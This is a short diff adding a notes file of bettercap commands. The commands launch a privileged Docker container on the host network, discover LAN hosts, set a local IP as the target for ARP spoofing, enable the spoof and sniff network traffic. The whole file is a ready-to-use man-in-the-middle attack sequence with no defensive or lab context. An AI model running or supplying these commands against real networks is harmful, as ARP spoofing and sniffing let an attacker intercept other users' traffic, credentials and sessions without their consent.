@@ -1,0 +1,9 @@
+docker run -it --privileged --net=host bettercap/dev
+
+net.probe on
+net.show 
+// monitor
+set arp.spoof.targets  192.168.0.102 [IP]
+arp.spoof on 
+net.sniff on
+
